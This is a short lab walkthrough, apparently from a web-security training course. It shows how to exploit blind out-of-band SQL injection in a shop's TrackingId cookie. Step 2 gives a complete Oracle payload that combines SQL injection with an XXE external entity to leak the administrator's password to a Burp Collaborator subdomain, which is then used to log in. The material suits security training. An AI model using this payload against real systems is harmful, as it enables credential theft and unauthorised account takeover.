---
dg-publish: true
---






1. Visit the front page of the shop, and use [Burp Suite Professional](https://portswigger.net/burp/pro) to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic [XXE](https://portswigger.net/web-security/xxe) techniques as follows:`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
5. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the `administrator` user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
6. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.